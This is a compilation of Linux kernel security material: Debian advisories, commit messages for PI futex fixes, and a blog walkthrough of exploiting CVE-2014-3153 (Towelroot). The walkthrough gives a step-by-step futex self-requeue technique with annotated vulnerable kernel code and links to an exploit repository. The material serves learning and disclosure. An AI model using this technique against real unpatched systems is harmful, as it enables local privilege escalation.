Several vulnerabilities have been discovered in the Linux kernel that
may lead to a privilege escalation, denial of service or information
leaks.

CVE-2019-19318, CVE-2019-19813, CVE-2019-19816

    "Team bobfuzzer" reported bugs in Btrfs that could lead to a
    use-after-free or heap buffer overflow, and could be triggered by
    crafted filesystem images.  A user permitted to mount and access
    arbitrary filesystems could use these to cause a denial of service
    (crash or memory corruption) or possibly for privilege escalation.

CVE-2020-27815

    A flaw was reported in the JFS filesystem code allowing a local
    attacker with the ability to set extended attributes to cause a
    denial of service.

CVE-2020-27825

    Adam 'pi3' Zabrocki reported a use-after-free flaw in the ftrace
    ring buffer resizing logic due to a race condition, which could
    result in denial of service or information leak.

CVE-2020-28374

    David Disseldorp discovered that the LIO SCSI target implementation
    performed insufficient checking in certain XCOPY requests. An
    attacker with access to a LUN and knowledge of Unit Serial Number
    assignments can take advantage of this flaw to read and write to any
    LIO backstore, regardless of the SCSI transport settings.

CVE-2020-29568 (XSA-349)

    Michael Kurth and Pawel Wieczorkiewicz reported that frontends can
    trigger OOM in backends by updating a watched path.

CVE-2020-29569 (XSA-350)

    Olivier Benjamin and Pawel Wieczorkiewicz reported a use-after-free
    flaw which can be triggered by a block frontend in Linux blkback. A
    misbehaving guest can trigger a dom0 crash by continuously
    connecting / disconnecting a block frontend.

CVE-2020-29660

    Jann Horn reported a locking inconsistency issue in the tty
    subsystem which may allow a local attacker to mount a
    read-after-free attack against TIOCGSID.

CVE-2020-29661

    Jann Horn reported a locking issue in the tty subsystem which can
    result in a use-after-free. A local attacker can take advantage of
    this flaw for memory corruption or privilege escalation.

CVE-2020-36158

    A buffer overflow flaw was discovered in the mwifiex WiFi driver
    which could result in denial of service or the execution of
    arbitrary code via a long SSID value.

CVE-2021-3178

    吴异 reported an information leak in the NFSv3 server.  When only
    a subdirectory of a filesystem volume is exported, an NFS client
    listing the exported directory would obtain a file handle to the
    parent directory, allowing it to access files that were not meant
    to be exported.

    Even after this update, it is still possible for NFSv3 clients to
    guess valid file handles and access files outside an exported
    subdirectory, unless the "subtree_check" export option is enabled.
    It is recommended that you do not use that option but only export
    whole filesystem volumes.

CVE-2021-3347

    It was discovered that PI futexes have a kernel stack use-after-free
    during fault handling. An unprivileged user could use this flaw to
    crash the kernel (resulting in denial of service) or for privilege
    escalation.

CVE-2021-26930 (XSA-365)

    Olivier Benjamin, Norbert Manthey, Martin Mazein, and Jan
    H. Schönherr discovered that the Xen block backend driver
    (xen-blkback) did not handle grant mapping errors correctly.  A
    malicious guest could exploit this bug to cause a denial of
    service (crash), or possibly an information leak or privilege
    escalation, within the domain running the backend, which is
    typically dom0.

CVE-2021-26931 (XSA-362), CVE-2021-26932 (XSA-361), CVE-2021-28038 (XSA-367)

    Jan Beulich discovered that the Xen support code and various Xen
    backend drivers did not handle grant mapping errors correctly.  A
    malicious guest could exploit these bugs to cause a denial of
    service (crash) within the domain running the backend, which is
    typically dom0.

CVE-2021-27363

    Adam Nichols reported that the iSCSI initiator subsystem did not
    properly restrict access to transport handle attributes in sysfs.
    On a system acting as an iSCSI initiator, this is an information
    leak to local users and makes it easier to exploit CVE-2021-27364.

CVE-2021-27364

    Adam Nichols reported that the iSCSI initiator subsystem did not
    properly restrict access to its netlink management interface.  On
    a system acting as an iSCSI initiator, a local user could use
    these to cause a denial of service (disconnection of storage) or
    possibly for privilege escalation.

CVE-2021-27365

    Adam Nichols reported that the iSCSI initiator subsystem did not
    correctly limit the lengths of parameters or "passthrough PDUs"
    sent through its netlink management interface.  On a system acting
    as an iSCSI initiator, a local user could use these to leak the
    contents of kernel memory, to cause a denial of service (kernel
    memory corruption or crash), and probably for privilege
    escalation.

For Debian 9 stretch, these problems have been fixed in version
4.9.258-1.

We recommend that you upgrade your linux packages.

futex: Handle faults correctly for PI futexesfixup\_pi\_state\_owner() tries to ensure that the state of the rtmutex,
pi\_state and the user space value related to the PI futex are consistent
before returning to user space. In case that the user space value update
faults and the fault cannot be resolved by faulting the page in via
fault\_in\_user\_writeable() the function returns with -EFAULT and leaves
the rtmutex and pi\_state owner state inconsistent.
A subsequent futex\_unlock\_pi() operates on the inconsistent pi\_state and
releases the rtmutex despite not owning it which can corrupt the RB tree of
the rtmutex and cause a subsequent kernel stack use after free.
It was suggested to loop forever in fixup\_pi\_state\_owner() if the fault
cannot be resolved, but that results in runaway tasks which is especially
undesired when the problem happens due to a programming error and not due
to malice.
As the user space value cannot be fixed up, the proper solution is to make
the rtmutex and the pi\_state consistent so both have the same owner. This
leaves the user space value out of sync. Any subsequent operation on the
futex will fail because the 10th rule of PI futexes (pi\_state owner and
user space value are consistent) has been violated.
As a consequence this removes the inept attempts of 'fixing' the situation
in case that the current task owns the rtmutex when returning with an
unresolvable fault by unlocking the rtmutex which left pi\_state::owner and
rtmutex::owner out of sync in a different and only slightly less dangerous
way.

Merge tag 'locking-urgent-2021-01-28' of git://git.kernel.org/pub/scm/linux/kernel/git/tip/tipPull locking fixes from Thomas Gleixner:
"A set of PI futex fixes:
- Address a longstanding issue where the user space part of the PI
futex is not writeable. The kernel returns with inconsistent state
which can in the worst case result in a UAF of a tasks kernel
stack.
The solution is to establish consistent kernel state which makes
future operations on the futex fail because user space and kernel
space state are inconsistent. Not a problem as PI futexes
fundamentaly require a functional RW mapping and if user space
pulls the rug under it, then it can keep the pieces it asked for.
- Address an issue where the return value is incorrect in case that
the futex was acquired after a timeout/signal made the waiter drop
out of the rtmutex wait.
In one of the corner cases the kernel returned an error code
despite having successfully acquired the futex"
\* tag 'locking-urgent-2021-01-28' of git://git.kernel.org/pub/scm/linux/kernel/git/tip/tip:
futex: Handle faults correctly for PI futexes
futex: Simplify fixup\_pi\_state\_owner()
futex: Use pi\_state\_update\_owner() in put\_pi\_state()
rtmutex: Remove unused argument from rt\_mutex\_proxy\_unlock()
futex: Provide and use pi\_state\_update\_owner()
futex: Replace pointless printk in fixup\_owner()
futex: Ensure the correct return value from futex\_lock\_pi()

Debian Bug     : 970736 972345 977048 977615

Several vulnerabilities have been discovered in the Linux kernel that
may lead to a privilege escalation, denial of service or information
leaks.

CVE-2020-27815

    A flaw was reported in the JFS filesystem code allowing a local
    attacker with the ability to set extended attributes to cause a
    denial of service.

CVE-2020-27825

    Adam 'pi3' Zabrocki reported a use-after-free flaw in the ftrace
    ring buffer resizing logic due to a race condition, which could
    result in denial of service or information leak.

CVE-2020-27830

    Shisong Qin reported a NULL pointer dereference flaw in the Speakup
    screen reader core driver.

CVE-2020-28374

    David Disseldorp discovered that the LIO SCSI target implementation
    performed insufficient checking in certain XCOPY requests. An
    attacker with access to a LUN and knowledge of Unit Serial Number
    assignments can take advantage of this flaw to read and write to any
    LIO backstore, regardless of the SCSI transport settings.

CVE-2020-29568 (XSA-349)

    Michael Kurth and Pawel Wieczorkiewicz reported that frontends can
    trigger OOM in backends by updating a watched path.

CVE-2020-29569 (XSA-350)

    Olivier Benjamin and Pawel Wieczorkiewicz reported a use-after-free
    flaw which can be triggered by a block frontend in Linux blkback. A
    misbehaving guest can trigger a dom0 crash by continuously
    connecting / disconnecting a block frontend.

CVE-2020-29660

    Jann Horn reported a locking inconsistency issue in the tty
    subsystem which may allow a local attacker to mount a
    read-after-free attack against TIOCGSID.

CVE-2020-29661

    Jann Horn reported a locking issue in the tty subsystem which can
    result in a use-after-free. A local attacker can take advantage of
    this flaw for memory corruption or privilege escalation.

CVE-2020-36158

    A buffer overflow flaw was discovered in the mwifiex WiFi driver
    which could result in denial of service or the execution of
    arbitrary code via a long SSID value.

CVE-2021-3347

    It was discovered that PI futexes have a kernel stack use-after-free
    during fault handling. An unprivileged user could use this flaw to
    crash the kernel (resulting in denial of service) or for privilege
    escalation.

CVE-2021-20177

    A flaw was discovered in the Linux implementation of string matching
    within a packet. A privileged user (with root or CAP_NET_ADMIN) can
    take advantage of this flaw to cause a kernel panic when inserting
    iptables rules.

For the stable distribution (buster), these problems have been fixed in
version 4.19.171-2.

We recommend that you upgrade your linux packages.

    Jann Horn reported a locking inconsistency issue in the tty
    subsystem which may allow a local attacker to mount a
    read-after-free attack against TIOCGSID.

CVE-2020-29661

    Jann Horn reported a locking issue in the tty subsystem which can
    result in a use-after-free. A local attacker can take advantage of
    this flaw for memory corruption or privilege escalation.

CVE-2020-36158

    A buffer overflow flaw was discovered in the mwifiex WiFi driver
    which could result in denial of service or the execution of
    arbitrary code via a long SSID value.

CVE-2021-3347

    It was discovered that PI futexes have a kernel stack use-after-free
    during fault handling. An unprivileged user could use this flaw to
    crash the kernel (resulting in denial of service) or for privilege
    escalation.

CVE-2021-20177

    A flaw was discovered in the Linux implementation of string matching
    within a packet. A privileged user (with root or CAP_NET_ADMIN) can
    take advantage of this flaw to cause a kernel panic when inserting
    iptables rules.

For Debian 9 stretch, these problems have been fixed in version
4.19.171-2~deb9u1.

We recommend that you upgrade your linux-4.19 packages.

FWIW, here's a recent writeup and exploit for a different futex
vulnerability:

<https://elongl.github.io/exploitation/2021/01/08/cve-2014-3153.html>
<https://github.com/elongl/CVE-2014-3153>

Might help someone get into futexes... and exploiting their bugs.

futex: Provide and use pi\_state\_update\_owner()Updating pi\_state::owner is done at several places with the same

This is also a preparation for a bug fix to avoid yet another copy of the
same code or alternatively introducing a completely unpenetratable mess of
gotos.

Subject: Linux Kernel: local priv escalation via futexes

Hi,

Yesterday a patchset was merged to Linux Kernel mainline, which could be used
to execute code in the kernel due to bugs in PI futexes.

I am filing a CVE request just now.

Ciao, Marcus

merge commit:

commit c64396cc36c6e60704ab06c1fb1c4a46179c9120
Merge: e5ff2cb9cf67 34b1a1ce1458
Author: Linus Torvalds <torvalds@...ux-foundation.org>
Date:   Thu Jan 28 11:18:43 2021 -0800

    Pull locking fixes from Thomas Gleixner:
     "A set of PI futex fixes:

       - Address a longstanding issue where the user space part of the PI
         futex is not writeable. The kernel returns with inconsistent state
         which can in the worst case result in a UAF of a tasks kernel
         stack.

         The solution is to establish consistent kernel state which makes
         future operations on the futex fail because user space and kernel
         space state are inconsistent. Not a problem as PI futexes
         fundamentaly require a functional RW mapping and if user space
         pulls the rug under it, then it can keep the pieces it asked for.

       - Address an issue where the return value is incorrect in case that
         the futex was acquired after a timeout/signal made the waiter drop
         out of the rtmutex wait.

         In one of the corner cases the kernel returned an error code
         despite having successfully acquired the futex"

    * tag 'locking-urgent-2021-01-28' of git://git.kernel.org/pub/scm/linux/kernel/git/tip/tip:
      futex: Handle faults correctly for PI futexes
      futex: Simplify fixup_pi_state_owner()
      futex: Use pi_state_update_owner() in put_pi_state()
      rtmutex: Remove unused argument from rt_mutex_proxy_unlock()
      futex: Provide and use pi_state_update_owner()
      futex: Replace pointless printk in fixup_owner()
      futex: Ensure the correct return value from futex_lock_pi()

Here’s some helpful context. "A futex overview and update” (2009) at <https://lwn.net/Articles/360699/>
"The futex mechanism... is a fast, lightweight kernel-assisted locking primitive for user-space applications. It provides for very fast uncontended lock acquisition and release. The futex state is stored in a user-space variable (an unsigned 32-bit integer on all platforms). Atomic operations are used in order to change the state of the futex in the uncontended case without the overhead of a syscall. In the contended cases, the kernel is invoked to put tasks to sleep and wake them up. Futexes are the basis of several mutual exclusion constructs commonly used in threaded programming."

More recently: "Rethinking the futex API” (2020): <https://lwn.net/Articles/823513/>
"The current effort to rework futexes appears to be driven by a couple of concerns. One that goes mostly unstated is the desire to create a system-call interface that makes a bit more sense than futex(), which is a complex, multiplexed API with wildly varying arguments and a number of special cases.”

futex: Replace pointless printk in fixup\_owner()If that unexpected case of inconsistent arguments ever happens then the
futex state is left completely inconsistent and the printk is not really
helpful. Replace it with a warning and make the state consistent.

futex: Ensure the correct return value from futex\_lock\_pi()In case that futex\_lock\_pi() was aborted by a signal or a timeout and the
task returned without acquiring the rtmutex, but is the designated owner of
the futex due to a concurrent futex\_unlock\_pi() fixup\_owner() is invoked to
establish consistent state. In that case it invokes fixup\_pi\_state\_owner()
which in turn tries to acquire the rtmutex again. If that succeeds then it
does not propagate this success to fixup\_owner() and futex\_lock\_pi()
returns -EINTR or -ETIMEOUT despite having the futex locked.
Return success from fixup\_pi\_state\_owner() in all cases where the current
task owns the rtmutex and therefore the futex and propagate it correctly
through fixup\_owner(). Fixup the other callsite which does not expect a
positive return value.

# Exploiting CVE-2014-3153 (Towelroot)

Jan 8, 2021

# Understanding The Kernel

For quite some time now, I’ve been wanting to unveil the internals of modern operating systems.

I didn’t like how the most basic and fundamental level of a computer was so abstract to me,

and that I did not *truly* grasp how some of it works, a “black-box”.

I’ve always been more than familiar with kernel and OS concepts,

but there’s a big gap from comprehending them as a user versus a kernel hacker.

**I wanted to see code, not words.**

In order to tackle that,
I decided to take on a small kernel exploit [challenge](https://github.com/elongl/pwnable.kr/tree/master/syscall), and in parallel read [Linux Kernel Development](https://books.google.co.il/books/about/Linux_Kernel_Development.html?id=3MWRMYRwulIC).
Initially, the thought of reading the kernel’s code seemed a bit spooky, *“I wouldn’t understand a thing”*.
Little by little, it wasn’t as intimidating, and honestly, it turned out to be quite easier than I expected.

Now, I feel tenfolds more comfortable to simply look something up in the source in order to understand how it works,
rather than searching man pages endlessly or consulting other people.

# Kernel Exploitation

The book was really nice and all, but I wanted to get my hands dirty.

I searched for a disclosed vulnerability within the Linux kernel,

my plan being that I’d read its flat description and develop my own exploit to it.

A friend recommended [CVE-2014-3153](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3153), also known as *Towelroot*, and I just went for it.

Back in the days, it was very commonly used in order to root Android devices.

# Fast Userspace Mutex

The vulnerability is based around a mechanism called *Futex* within the kernel.

Futex being a wordplay on *Fast userspace Mutex*.

The Linux kernel provides futexes as a building block for implementing userspace locking.

A Futex is identified by a piece of memory which can be shared
between processes or threads. In its bare form, a
Futex is a counter that can be incremented and decremented atomically
and processes can wait for its value to become positive.

Futex operation occurs entirely in userspace for the noncontended case.

The kernel is involved only to arbitrate the contended case.

Lock contention is a state where a thread attempts to acquire a lock that is already held by another thread.

> The futex() system call provides a method for waiting until a
> certain condition becomes true. It is typically used as a
> blocking construct in the context of shared-memory
> synchronization. When using futexes, the majority of the
> synchronization operations are performed in user space. A user-
> space program employs the futex() system call only when it is
> likely that the program has to block for a longer time until the
> condition becomes true. Other futex() operations can be used to
> wake any processes or threads waiting for a particular condition.

I will cover **only** the terms and concepts related to the exploitation.

For a more profound insight about futexes, please reference [man futex(2)](https://man7.org/linux/man-pages/man2/futex.2.html) and [man futex(7)](https://man7.org/linux/man-pages/man7/futex.7.html).

I strongly suggest messing around with the examples in order to assess your understanding.

The `futex()` syscall isn’t typically used by “everyday” programs, but rather by system libraries such as `pthreads` that wrap its usage.
That’s why the syscall doesn’t have a glibc wrapper like most syscalls do.
In order to call it, one has to use `syscall(SYS_futex, ...)`.

Due to the blocking nature of `futex()` and it being a way to synchronize between different tasks,

you’d notice how there’s a lot of dealing with threads within the exploit which can get slightly confusing unless approached slowly.

There are two core concepts to understand about futexes in general which we’d talk a lot about.

The first is something’s called a *waiters list*, also known as the *wait queue*.

This term refers to the blocking threads that are currently waiting for a lock to be released.

It is held in kernelspace and programs can issue syscalls to carry out operations on it.
For instance, attempting to lock a contended lock would result in an insertion of a waiter,
releasing a lock would pop a waiter from the list and reschedule its task.

The second is that there are two kinds of futexes: PI & non-PI.

PI stands for [Priority Inheritance](https://en.wikipedia.org/wiki/Priority_inheritance).

> Priority inheritance is a mechanism for dealing with the
> priority-inversion problem. With this mechanism, when a high-
> priority task becomes blocked by a lock held by a low-priority
> task, the priority of the low-priority task is temporarily raised
> to that of the high-priority task, so that it is not preempted by
> any intermediate level tasks, and can thus make progress toward
> releasing the lock.

This introduces the ability to prioritize waiters among the futex’s waiters list.

A higher-priority task is guaranteed to get the lock faster than a lower-priority task.

Unlike non-PI operations, for instance.

> FUTEX\_WAKE
>
> This operation wakes at most val of the waiters that are
> waiting (e.g., inside FUTEX\_WAIT) on the futex word at the
> address uaddr. Most commonly, val is specified as either
> 1 (wake up a single waiter) or INT\_MAX (wake up all
> waiters). No guarantee is provided about which waiters
> are awoken (e.g., a waiter with a higher scheduling
> priority is **not guaranteed** to be awoken in preference to a
> waiter with a lower priority).

Both non-PI and PI futex types are used within the exploit.

The way PI futexes are implemented is using what’s called in the kernel a *plist*, a priority-sorted list.

If you don’t know what it is, you could take a look [here](https://elixir.bootlin.com/linux/v3.11.4/source/include/linux/plist.h#L46),
though this image sums it up perfectly.

# Bug & Vulnerability

Here’s the CVE description.

> The futex\_requeue function in kernel/futex.c in the Linux kernel through 3.14.5
> does not ensure that calls have two different futex addresses, which allows local users to gain privileges
> via a crafted FUTEX\_REQUEUE command that facilitates unsafe waiter modification.

Let’s break it down.

First, we need to understand what’s a requeue operation in the context of futexes.

A waiter, blocking thread, that is contending on a lock,
can be “requeued” by a running thread to be told to wait on a different lock instead of the one that it currently waits on.

A waiter on a non-PI futex can be requeued to either a different non-PI futex, or to a PI-futex.

A waiter on a PI-futex cannot be requeued.

The bug itself is that there are **no validations whatsoever on requeuing from a futex to itself**.

This allows us to requeue a PI-futex waiter to itself, which clearly violates the following policy.

> FUTEX\_CMP\_REQUEUE\_PI
>
> Requeues waiters that are blocked via
> FUTEX\_WAIT\_REQUEUE\_PI on uaddr from a **non-PI source** futex
> (uaddr) to a **PI target** futex (uaddr2).

Take a look at the [bug fix commit](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=e9c243a5a6de0be8e584c604d353412584b592f8), both the description and the code changes.

Though, what actually happens when you requeue a waiter to itself? Good question.

Before actually diving into the exploit, I decided to provide a rough overview of how it works for context further on.
Eventually, what this bug gives us is a **dangling waiter** within the futex’s waiters list.
The way the exploit does that is as follows:

| **Step** | **Operation** | **Description** |
| --- | --- | --- |
| 1. | `FUTEX_LOCK_PI` | Lock a PI futex. |
| 2. | `FUTEX_WAIT_REQUEUE_PI` | Wait on a non-PI futex, with the intention of being requeued to the PI futex. |
| 3. | `FUTEX_CMP_REQUEUE_PI` | Requeue the non-PI futex waiter onto the PI futex. |
| 4. | Userspace Overwrite | Set the PI futex’s value to `0` so that the kernel treats it as if the lock is available. |
| 5. | `FUTEX_CMP_REQUEUE_PI` | Requeue the PI futex waiter to **itself**. |

And now we’ll understand why this results in a dangling waiter.

There are a lot of different data types within the Futex’s implementation code,

in order to cope with that I made somewhat of a [summary of them](https://github.com/elongl/CVE-2014-3153/blob/master/notes.md#data-structures) to help me keep track of what’s going on.
Feel free to use it as needed.

**Step 1**

We start off by locking the PI-futex.
We do that because we want the first requeue (step 3) to block and create a waiter on the waiters list, rather than acquire the lock immediately.
That waiter is destined to be our dangling waiter later on in the exploit.

**Step 2**

In order to requeue a waiter from a non-PI –> PI futex, we first have to invoke `FUTEX_WAIT_REQUEUE_PI` on the non-PI futex,
which in turn translates to the [`futex_wait_requeue_pi()`](https://elixir.bootlin.com/linux/v3.11.4/source/kernel/futex.c#L2285) function.

What this function does is take a non-PI futex and wait (`FUTEX_WAIT`) on it,
and a PI-futex that it can *potentially* be requeued to with a `FUTEX_CMP_REQUEUE_PI` command later on.

```
static int futex_wait_requeue_pi(u32 __user *uaddr, unsigned int flags,
				 u32 val, ktime_t *abs_time, u32 bitset,
				 u32 __user *uaddr2)
{
	struct hrtimer_sleeper timeout, *to = NULL;
	struct rt_mutex_waiter rt_waiter; // <-- Important
	struct rt_mutex *pi_mutex = NULL;
	struct futex_hash_bucket *hb;
	union futex_key key2 = FUTEX_KEY_INIT;
	struct futex_q q = futex_q_init;
	int res, ret;
  ...

```

The function defines various local variables, the most important of which is the `rt_waiter` variable.

Unsurprisingly, this variable is our waiter.

```
struct rt_mutex_waiter {
    struct plist_node    list_entry;
    struct plist_node    pi_list_entry;
    struct task_struct    *task;
    struct rt_mutex        *lock;
};

```

It contains the `lock` that it waits on,
it holds references to other waiters in the waiters list through the `list_entry` plist node,
and on top of that it also has a pointer to the `task` that it currently blocks.

Needless to say that the locals are placed on the kernel stack,
but also worth mentioning that because it’ll be crucial to understand in the near future.

Later on, it initializes the futex queue entry and enqueues it.

```
	q.bitset = bitset;
	q.rt_waiter = &rt_waiter;
	q.requeue_pi_key = &key2;
  ...
	/* Queue the futex_q, drop the hb lock, wait for wakeup. */
	futex_wait_queue_me(hb, &q, to);

```

Note how it sets the `requeue_pi_key` to the futex key of the target futex.

This is part of what allows us to self-requeue. We’ll see this in the final step.

At this point in the code, the function simply blocks and does not continue unless:

1. A wakeup occurs.
2. The process is killed.

**Step 3**

Next up, [`futex_requeue()`](https://elixir.bootlin.com/linux/v3.11.4/source/kernel/futex.c#L1264) is called by the `FUTEX_CMP_REQUEUE_PI` operation in another thread in order to do the heavy lifting of actually requeuing the waiter.
This is the **vulnerable** and most important function in the exploit.
The function is fairly long and therefore I’m not going to review all of its logic, and rather only address the relevant parts.

I do encourage you to brief over it and try to get a hold of what it does.

```
static int futex_requeue(u32 __user *uaddr1, unsigned int flags,
             u32 __user *uaddr2, int nr_wake, int nr_requeue,
             u32 *cmpval, int requeue_pi)
{
...
    if (requeue_pi && (task_count - nr_wake < nr_requeue)) {
        ret = futex_proxy_trylock_atomic(uaddr2, hb1, hb2, &key1,
                &key2, &pi_state, nr_requeue);
	/*
	 * Lock is already acquired due to our call to FUTEX_LOCK_PI in step 1.
	 * Therefore the acquisition fails and 0 is returned.
	 * We will revisit futex_proxy_trylock_atomic below.
	 */
...
    head1 = &hb1->chain;
    plist_for_each_entry_safe(this, next, head1, list) {
...
        if (requeue_pi) {
            atomic_inc(&pi_state->refcount);
            this->pi_state = pi_state;
            ret = rt_mutex_start_proxy_lock(&pi_state->pi_mutex,
                            this->rt_waiter,
                            this->task, 1);
	/*
	 * this->rt_waiter points to the local variable rt_waiter
	 * in the futex_wait_requeue_pi from step 2.
	 * It is now added as a waiter on the new lock.
	 */
...
}

```

Let’s quickly glance at the code that requeues the waiter at [`rt_mutex_start_proxy_lock()`](https://elixir.bootlin.com/linux/v3.11.4/source/kernel/rtmutex.c#L962).

```
int rt_mutex_start_proxy_lock(struct rt_mutex *lock,
			      struct rt_mutex_waiter *waiter,
			      struct task_struct *task, int detect_deadlock)
{
	int ret;

	raw_spin_lock(&lock->wait_lock);

	// Attempt to take the lock. Fails because lock is taken.
	if (try_to_take_rt_mutex(lock, task, NULL)) {
		raw_spin_unlock(&lock->wait_lock);
		return 1;
	}

	ret = task_blocks_on_rt_mutex(lock, waiter, task, detect_deadlock);
	...

```

And inside [`task_blocks_on_rt_mutex()`](https://elixir.bootlin.com/linux/v3.11.4/source/kernel/rtmutex.c#L405).

```
static int task_blocks_on_rt_mutex(struct rt_mutex *lock,
				   struct rt_mutex_waiter *waiter,
				   struct task_struct *task,
				   int detect_deadlock)
{
	struct task_struct *owner = rt_mutex_owner(lock);
	struct rt_mutex_waiter *top_waiter = waiter;
	unsigned long flags;
	int chain_walk = 0, res;
...
	// Set the waiter's task and rt_mutex members.
	waiter->task = task;
	waiter->lock = lock;
	// Initialize the waiter's list entries.
	plist_node_init(&waiter->list_entry, task->prio);
	plist_node_init(&waiter->pi_list_entry, task->prio);

	/* Get the top priority waiter on the lock */
	if (rt_mutex_has_waiters(lock))
		top_waiter = rt_mutex_top_waiter(lock);

	// Add the waiter to the waiters list.
	plist_add(&waiter->list_entry, &lock->wait_list);
...

```

Now, `rt_waiter` of [`futex_wait_requeue_pi()`](https://elixir.bootlin.com/linux/v3.11.4/source/kernel/futex.c#L2285) is a node in the waiters list of our PI futex.

**Step 4**

Here we’ll set the userspace value of the futex, also known as the futex-word, to `0`.

This is vital so that when the self-requeuing occurs,
the call to [`futex_proxy_trylock_atomic()`](https://elixir.bootlin.com/linux/v3.11.4/source/kernel/futex.c#L1202) will succeed and wake the top waiter of the source futex,
which is in fact the same as the destination futex.
The problem arises when we have a waiter in the waiters list whose thread we can wake up without forcing its deletion from the waiters list.

It might seem confusing at first but it’ll clear up in the next step.

**Step 5**

On this step, we’ll requeue the PI futex waiter to itself and invoke [`futex_requeue()`](https://elixir.bootlin.com/linux/v3.11.4/source/kernel/futex.c#L1264) once again.

```
if (requeue_pi && (task_count - nr_wake < nr_requeue)) {
		/*
		 * Attempt to acquire uaddr2 and wake the top waiter. If we
		 * intend to requeue waiters, force setting the FUTEX_WAITERS
		 * bit.  We force this here where we are able to easily handle
		 * faults rather in the requeue loop below.
		 */
		ret = futex_proxy_trylock_atomic(uaddr2, hb1, hb2, &key1,
						 &key2, &pi_state, nr_requeue);
     ...

```

Let’s take a look at [`futex_proxy_trylock_atomic()`](https://elixir.bootlin.com/linux/v3.11.4/source/kernel/futex.c#L1202) this time.

```
/*
 * Return:
 *  0 - failed to acquire the lock atomically;
 *  1 - acquired the lock;
 * <0 - error
 */
static int futex_proxy_trylock_atomic(u32 __user *pifutex,
				 struct futex_hash_bucket *hb1,
				 struct futex_hash_bucket *hb2,
				 union futex_key *key1, union futex_key *key2,
				 struct futex_pi_state **ps, int set_waiters)
{
	struct futex_q *top_waiter = NULL;
	u32 curval;
	int ret;
...
	top_waiter = futex_top_waiter(hb1, key1);

	/* There are no waiters, nothing for us to do. */
	if (!top_waiter)
		return 0;

	/* Ensure we requeue to the expected futex. */
	if (!match_futex(top_waiter->requeue_pi_key, key2))
		return -EINVAL;

	/*
	 * Try to take the lock for top_waiter.  Set the FUTEX_WAITERS bit in
	 * the contended case or if set_waiters is 1.  The pi_state is returned
	 * in ps in contended cases.
	 */
	ret = futex_lock_pi_atomic(pifutex, hb2, key2, ps, top_waiter->task,
				   set_waiters);
	if (ret == 1)
		requeue_pi_wake_futex(top_waiter, key2, hb2);

	return ret;
}

```

Pay attention to how it ensures that the `requeue_pi_key` of the `top_waiter` is equal to the requeue’s target futex’s key.
This is why we need to **self-requeue**, and why it *wouldn’t* be sufficient to just set the value of a different futex in userspace to `0` and requeue to it.

So the requirements for triggering the bug are:

1. The target futex from the [`futex_wait_requeue_pi()`](https://elixir.bootlin.com/linux/v3.11.4/source/kernel/futex.c#L2285) remains.
2. There’s a waiter that is actively contending on the source futex.

The only scenario that meets both these terms is a self-requeue.

Other than that, basically all it does is call [`futex_lock_pi_atomic()`](https://elixir.bootlin.com/linux/v3.11.4/source/kernel/futex.c#L718) and if the lock was acquired,

wake up the top waiter of the source futex.

```
static int futex_lock_pi_atomic(u32 __user *uaddr, struct futex_hash_bucket *hb,
				union futex_key *key,
				struct futex_pi_state **ps,
				struct task_struct *task, int set_waiters)
{
	int lock_taken, ret, force_take = 0;
	u32 uval, newval, curval, vpid = task_pid_vnr(task);

retry:
	ret = lock_taken = 0;

	/*
	 * To avoid races, we attempt to take the lock here again
	 * (by doing a 0 -> TID atomic cmpxchg), while holding all
	 * the locks. It will most likely not succeed.
	 */
	newval = vpid;
	if (set_waiters)
		newval |= FUTEX_WAITERS;

	if (unlikely(cmpxchg_futex_value_locked(&curval, uaddr, 0, newval)))
		return -EFAULT;
	...
	/*
	 * Surprise - we got the lock. Just return to userspace:
	 */
	if (unlikely(!curval))
		return 1;
	...

```

The function attempts to [atomically](https://wiki.osdev.org/Atomic_operation) compare-and-exchange the futex-word.
It compares it to `0` which is the value that signals the lock is free and exchanges it with the task’s PID.

This operation is `unlikely` to succeed because the user could’ve done it in userspace and avoid the expensive syscall,
therefore the assumption is that the user wasn’t able to retrieve the lock in userspace and needed the kernel’s “help”.
That’s why it would be a “surprise” in case it *was able* to get the lock.

Recalling the function above, if we successfully took control of the lock, we’d wake the top waiter,
which is the waiter that was added to the waiters list on the first requeue (step 3).

Because we overwrote the value in userspace (step 4), the function **succeeds and wakes the waiter**.

```
ret = futex_lock_pi_atomic(pifutex, hb2, key2, ps, top_waiter->task,
				   set_waiters);
	if (ret == 1)
		requeue_pi_wake_futex(top_waiter, key2, hb2);

```

When [`futex_requeue()`](https://elixir.bootlin.com/linux/v3.11.4/source/kernel/futex.c#L1264) wakes up the waiter,
it sets the `rt_waiter` to `NULL` in order to signal [`futex_wait_requeue_pi()`](https://elixir.bootlin.com/linux/v3.11.4/source/kernel/futex.c#L2285) that the atomic lock acquisition was successful.

```
static inline
void requeue_pi_wake_futex(struct futex_q *q, union futex_key *key,
			   struct futex_hash_bucket *hb)
{
	get_futex_key_refs(key);
	q->key = *key;

	__unqueue_futex(q);

	WARN_ON(!q->rt_waiter);
	q->rt_waiter = NULL; // Right here.

	q->lock_ptr = &hb->lock;

	// Start scheduling the task again.
	wake_up_state(q->task, TASK_NORMAL);
}

```

Its usage is seen here within [`futex_wait_requeue_pi()`](https://elixir.bootlin.com/linux/v3.11.4/source/kernel/futex.c#L2285).

```
/* Check if the requeue code acquired the second futex for us. */
	if (!q.rt_waiter) {
		/*
		 * Got the lock. We might not be the anticipated owner if we
		 * did a lock-steal - fix up the PI-state in that case.
		 */
		 ...
	} else {
		/*
		 * We have been woken up by futex_unlock_pi(), a timeout, or a
		 * signal.  futex_unlock_pi() will not destroy the lock_ptr nor
		 * the pi_state.
		 */
		 ...
		 // Removes the waiter from the wait_list.
		ret = rt_mutex_finish_proxy_lock(pi_mutex, to, &rt_waiter, 1);
		...
		/* Unqueue and drop the lock. */
		unqueue_me_pi(&q);
	}

```

And as we can see, [`rt_mutex_finish_proxy_lock()`](https://elixir.bootlin.com/linux/v3.11.4/source/kernel/rtmutex.c#L1033) is *not* being called since `rt_waiter` is `NULL`,
and therefore the waiter is kept as-is within the waiters list.

#### Recap

We start off by locking a PI-futex.
Then we simply requeue a thread to it which creates a waiter entry on the futex’s waiters list.
Afterwards, we overwrite the futex-word with `0`. Once we’ll requeue the waiting thread onto itself,
the attempt to atomically own the lock and wake the top waiter on the source (which is also the destination) futex succeeds.

![Recap Image](https://i.imgur.com/0qp366z.png)

This leaves us with a dangling waiter on the waiters list whose thread has continued and is up and running.
